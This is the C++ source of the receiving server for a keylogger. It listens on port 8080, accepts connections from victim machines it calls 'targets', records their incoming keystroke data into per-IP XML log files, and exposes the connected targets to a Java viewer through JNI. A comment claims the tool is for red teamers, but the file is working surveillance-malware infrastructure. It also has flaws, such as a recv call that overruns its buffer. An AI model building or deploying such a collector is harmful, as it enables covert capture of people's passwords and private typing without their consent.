#include <winsock2.h>
#include <mswsock.h>
#include "ServerInterProcess.h"
#include "keyloggerinterface.h"
#include <stdio.h>
#include <stdlib.h>
#include <thread>
#include <mutex>
#include <fcntl.h>
#include <io.h>
#include <jni.h>
HANDLE mu;
SOCKETLIST *head;
JavaVM* jvm;
JNIEnv* env;
int ConnectionCount;
JNICALL void setConsoleColorDefault()
{
    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon,0x0f);
}
JNICALL void setConsoleColorCaptureInformationCB()
{
     HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon,0x30);
}
JNICALL void setConsoleColorProcessInformation()
{
    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon,0x2f);
}
JNICALL void setConsoleColorTitleInformation()
{
    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon,0x4f);
}
JNICALL void setConsoleColorCaptureInformationKL()
{
    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon,0x60);
}


 JNICALL jobjectArray getBuffer()
  {
    jclass cls = env->FindClass("keyloggerinterface/keylogdata");
    jmethodID cid = env->GetMethodID(cls,"<init>", "(JLjava/lang/String;)V");
    SOCKETLIST *sl_h,*sl_c ;
    jobjectArray ret = env->NewObjectArray(ConnectionCount,cls,NULL);
    WaitForSingleObject(mu,INFINITE);

    if(head->target != NULL)
    {
        sl_h = sl_c= head;

        for(int x=0; x< ConnectionCount; x++)
        {
            jlong ipadd = sl_c->IPADDR;
            jstring str = env->NewStringUTF(const_cast<char*>(sl_c->name));

            env->SetObjectArrayElement(ret,x,env->NewObject(cls,cid,ipadd,str));
            sl_c =sl_c->nextTarget;
        }
        while ((sl_c) != sl_h);
    }
    ReleaseMutex(mu);
      return ret;
  }
/**
    Title: Listener
    Description: opens a listening socket and initiate the 
    server. continue to add connections to the global self
    referential linked list. increment the connection count
    
*/
void Listener()
{

    WSADATA WSA;
    /*
        create the server listener socket.
    */
    SOCKET Listener;
    /*
        create the sockaddrs for the server and the target
    */
    SOCKADDR_IN server, target;
    /*
        initiate the head socket list item 
    */
    head= static_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
    /*
        set the heads target and next target to null
    */
    (head->nextTarget)=0x00;
    (head->target)=0x00;
    /*  
        declare a timestamp item for file naming
    */
    SYSTEMTIME timestamp;
    /*
        wait for the main thread to finish priority increments
        and other console output
    */
    WaitForSingleObject(mu,INFINITE);
    ReleaseMutex(mu);
    /*
        integer to hold the size of the SOCKADDR_IN structure
    */
    int cL;
    /*
        greeting message for the server.
    */
    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    fprintf(stderr ,"\t[*] Initalizing socket...\n");
    /*
        attempt to start the windows socket api
    */
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return;
    }
    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    /*
        attempt to create a socket.
    */
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
        return;
    }
    /*
        set the parameters for the server connections
    */
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
    /*
        bind the socket according to the parameters set by the server.
    */
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
        return;
    }
    /*
        this server is not designed to spy on several hundred people connecting 
        simultaneously, instead this is designed for red team and pen-testers. though 
        this server may handle more, a backlog of connections should not pass 3
    */
    listen(Listener,3);
    /*
        set cl to the size of the target's SOCKADDR_in structure.
    */
    cL=sizeof(target);
    /*
        declare a buffer to hold the name of the log file.
    */
    char* name;
    /*
        listen for connections indefinitely
    */
    while(true)
    {
        /*
            declare a Socket and allocate the space for the socket structure
        */
        SOCKET *acceptedTarget = reinterpret_cast<SOCKET*>(malloc(sizeof(SOCKET)));
        /*
            wait indefinitely for the next connection to be established
        */
        *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
        /*
            declare a SOCKETLIST structure and allocate memory for the structure
        */
        SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
        /*
            if the target failed then inform the end user of the failure and proceed 
            without further processing.
        */
        if(*acceptedTarget==INVALID_SOCKET)
        {
            fprintf(stderr ,"\n\t\t[*] error connecting");
        }
        else
        {
            /*
                an integer that holds the mode value of the socket.
            */
            u_long mode =1;
            /*
                set the socket to nonblocking.
            */
            ioctlsocket(*acceptedTarget,FIONBIO,&mode);
            /*
                allocate space to hold the name/
            */
            name = static_cast<char*>(malloc(0x100));
            /*
                set the link name pointer to the allocated memory
            */
            link->name = name;
            /*
                set this links target to the accepted target
            */
            link->target = acceptedTarget;
            /*
                if a file from the same ip is created at the same time then the naming convention
                may fail. try again for a new time_stamp.
            */
            do
            {
                /*
                    get the current system timeto generate the xml log name.
                */
                GetSystemTime(&timestamp);
                /*
                    generate the log file name/
                */
                sprintf(link->name,".\\logged\\%ld_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                    timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
                /*
                    create the log file handle and insert it into the link.
                */
                link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                               FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                               FILE_ATTRIBUTE_NORMAL,NULL);
            /*
                repeat the logfile generation untill successful
            */
            }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
            /*
                set the internal file pointer in the fileDescriptor to position 0
                within the xml document
            */
            SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
            /*
                write the xml header to the file
            */
            WriteFile(link->FileDescriptor,
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);

            /*
                establish a self referential linked list,
                    A->B->C->A...
                each link contains a socket so the listener thread can read data off of the
                socket.
            */
            link->IPADDR = htonl(target.sin_addr.S_un.S_addr);
            /*
                we have a newly created socketlist structure that can be added
                to the global link list, to do this safely we must register a lock 
                to the mutex.
            */
            WaitForSingleObject(mu,INFINITE);

            if((head->target)==0x00)
            {
                /*
                    if the head is null then point the 
                    head to the link.
                */
                *head=*link;
                /*
                    self reference the head to itself.
                */
                head->nextTarget=head;
            }
            else
            {
                /*
                    if the head is not null then we must insert a 
                    new node. set the links next target to the heads
                    next target.
                */
                link->nextTarget=head->nextTarget;
                /*
                    point the next target of the head towards the link.
                */
                head->nextTarget=link;
            }
            /*
                increment the connection count.
            */
            ConnectionCount++;
            /*
                release the mutex handle. 
            */
            ReleaseMutex(mu);

        }

    }

}
/**
    Title: Handler
    Description: Processes pre established connections listening for data to come in
    on any of the sockets stored in the self referential linked list, if data is present
    on the buffer then it is written to the xml file that corresponds to that connection
    when a connection is closed then tis method should close all open handles and remove
    that connection from the linked list.
    this method should only accept 4096 bytes at a time
*/
void Handler()
{
        /*
            the  buffer that stores data off of incoming socket streams
        */
        char* buffer = static_cast<char *>(malloc(0x1000));
        /*
            a temporary link that stores the current socket being processed by this
            server
        */
        SOCKETLIST *link;
        while(1)
        {
           /*
                wait for a connection to be established but don't spin uncontrollably and
                waist cpu time
           */
            while(head==nullptr ||(head->target)== NULL )
                Sleep(1);
            /*
                if a connection is established then wait for the mutex lock to protect the
                buffer
            */
            WaitForSingleObject(mu,INFINITE);
            /*
                set the link to the head of the self referential linked list.
            */
            link=head;
            /*
                the head was successfully set. release the mutex lock
            */
            ReleaseMutex(mu);
            /*
                stay in the main handling loop until the next target becomes null,
            */
            while((head->target)!=NULL)
            {
                /*
                    receive data from this link while data can be received but do not block
                    instead let the execution continue on and process the next socket.
                */
                while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                {
                        /*
                            ensure that the last byte in the received buffer is null terminated
                        */
                        *(buffer+0x1000)=0x00;
                        /*
                            write the entire contents of the null terminated buffer to the corresponding
                            xml output file.
                        */
                        WriteFile(link->FileDescriptor,buffer,strlen(buffer),NULL,NULL);
                        /*
                            write the ending xml tag to the xml file so that the document is always complete
                        */
                        WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                  strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
                        /*
                            set the file pointer back to the start of the ending xml tag so it can be over-written
                            in the next pass.
                        */
                        SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
                }
                /*
                    if the accept method would normally block then an error hasn't occurred remove the error and
                    move to the next socket in the list.
                */
                if (WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    /*
                        delay 1 ms before getting the next quantum this thread will be scheduled
                        for.
                    */
                    Sleep(1);
                    /*
                        clear the last error for the next iteration
                    */
                    WSASetLastError(0x00);
                    /*
                        move on to the next socket in the connection list
                    */
                    link = (link->nextTarget);
                    Sleep(1); //give up a millisecond to stop heavy disk right from crashing the program
                }
                /*
                    if the connection is errored out and disconnected then this program should terminate
                    that connection and close resources properly.
                */
                else
                {
                    /*
                        register a lock on the global mutex that protects the buffer.
                    */
                   WaitForSingleObject(mu,INFINITE);
                   /*
                        create a socketlist to hold the nexttarget
                   */
                   SOCKETLIST temp = *(link->nextTarget);
                   /*
                        if the next target is the same as the current target
                        then the current target is the only link in the list. close this
                        target.
                   */
                   if( link->target == temp.target)
                    {
                        /*
                            set the head to null
                        */
                        head->target=0x00;
                        /*
                            set the next target to null
                        */
                        head->nextTarget=0x00;
                        /*
                            set the ip address to null
                        */
                        head->IPADDR=0x00;
                        /*
                            close the file descriptor handle
                        */
                        CloseHandle(head->FileDescriptor);
                    }
                    else
                    {
                        /*
                            set the link target to the next targets target
                        */
                        link->target = link->nextTarget->target;
                        /*
                            set this links name to the next targets name.
                        */
                        link->name = link->nextTarget->name;
                        /*
                            set this links IPADDR to the next links IPADDR
                        */
                        link->IPADDR=link->nextTarget->IPADDR;
                        /*
                            close the handle to this links FileDescriptor
                        */
                        CloseHandle(link->FileDescriptor);
                        /*
                            set this links file descriptor to the next links file
                            descriptor
                        */
                        link->FileDescriptor = link->nextTarget->FileDescriptor;
                        /*
                            set this links next target to the next target of the
                            next target.
                        */
                        link->nextTarget=link->nextTarget->nextTarget;
                        /*
                            set the head to the new link.
                        */
                        head = link;
                    }
                    /*
                        in this branch of execution the number of branches has decremented
                        indicate that this has happened.
                    */
                    ConnectionCount--;
                    /*
                        release the handle to the mutex.
                    */
                    ReleaseMutex(mu);
                }

            }
        }
}
/**
    Title: main
    Description: initiates the java virtual machine and starts the
    two threads that process connections. thread 1 controls the initial
    connections and inserts them into a self referential linked list,
    thread 2 iterates through the linked list and reads any incoming data
    to an xml file.
    the main thread finishes by transitioning into the jvm which is left to
    control the user interface. the user-interface is subject to change over the
    course of time but should enable the user to do the following.
        1.) view all incoming connections from targets.
        2.) display dumps of the xml in a human readable form to the end user.
*/
int main()
{
    /*
        set a global counter on the number of established connections to zero.
    */
    ConnectionCount=0;
    /*a
        initiate the mutex lock that secures the connection buffer during any
        access.
    */
    mu = CreateMutex(NULL,false,NULL);
    /*
        wait until this thread can get a handle to the mutex lock and establish
        that a lock is present.
    */
    WaitForSingleObject(mu,INFINITE);
    /*
        establish a schedule parameter to set a high priority thread on the listener
        thread and the handler thread
    */
    sched_param sch_params;
    /*
        set the scheduler priority to the highest priority.
            [NOTE: this is not a real time thread. DO NOT change this thread priority
            to real time under any circumstance]
    */
    sch_params.sched_priority =THREAD_PRIORITY_HIGHEST;
    /*
        start the listener thread that will connect clients and insert the socket into
        a self referential linked list.
    */
    std::thread thread1 (Listener);
    /*
        attempt to increase the listener threads priority to a high priority thread.
    */
    if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
    {
        printf("[*] priority of connection listener increased successfully!\n");
    }
    /*
        establish the thread that handles the data that comes in on the connections.
    */
    std::thread thread2 (Handler);
    /*
        attempt to increase the handler threads priority to high priority.
    */
    if(pthread_setschedparam(thread2.native_handle(),SCHED_RR,&sch_params))
    {
        printf("[*] priority of data listener increased successfully!\n");
    }
    /*
        now that the threads have been started and their process level has increased
        the mutex can be unlcoked allowing for the other threads to begin processing.
    */
    ReleaseMutex(mu);
    /*
        release the remainder of the quantum and wait for 1/10th of a second before initiating
        the java thread, give the handler and listener time to process without a priority boost
        interrupt.
    */
    Sleep(100);
    /*
        create the variable that stores the initiating java virtual machine arguments.
    */
    JavaVMInitArgs args;
    /*
        create a new jvm options to store the class path
    */
    JavaVMOption *option = new JavaVMOption[1];
    /*
        set the class path relative to the binary and locate the keylogger interface.
    */
    option[0].optionString= const_cast<char*>("-Djava.class.path=.\\KeyLoggerInterface\\build\\classes;");
    /*
        initiate the jvm to version 8
    */
    args.version = JNI_VERSION_1_8;
    /*
        only one argument is being passed to the virtual machine
    */
    args.nOptions = 1;
    /*
        the argument which is used to init the class file is set here.
    */
    args.options = option;
    args.ignoreUnrecognized = false;
    /*
        crate the jvm with all relevant information
    */
    jint k = JNI_CreateJavaVM(&jvm,reinterpret_cast<void**>(&env),&args);
    /*
        if the java native interface was not properly established then exit.
    */
    if (k != JNI_OK)
    {

        return -1;
    }
    /*
        select the classes to run which are at the directory previously established.
    */
    jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
    /*
    load all the relavant native interfaces from the jvm and set them to the appropriate native function call
    */
    JNINativeMethod methods[] = {const_cast<char*>("getBuffer"), const_cast<char*>("()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;"), (void*)&getBuffer,
                                const_cast<char*>("setConsoleColorDefault"), const_cast<char*>("()V"),(void*)&setConsoleColorDefault,
                                const_cast<char*>("setConsoleColorCaptureInformationCB"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationCB,
                                const_cast<char*>("setConsoleColorProcessInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorProcessInformation,
                                const_cast<char*>("setConsoleColorTitleInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorTitleInformation,
                                const_cast<char*>("setConsoleColorCaptureInformationKL"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationKL};
    /*
        locate the init method in the class file and proceed with a call to create a new object.
    */
    jmethodID Init = env->GetMethodID(cls,"<init>","()V");
    jobject obj = env->NewObject(cls,Init);
    /*
        register all the native methods from the jvm back to native code.
    */
    env->RegisterNatives(cls,methods,6);
    /*
        define the entry point method into the jvm.
    */
    jmethodID Init_Console = env->GetMethodID(cls,"Console","()V");
    /*
        call the initiating java method.
    */
    env->CallVoidMethod(obj,Init_Console);
    delete option;
    thread1.join(); // never passes this point.


    return 0;
}
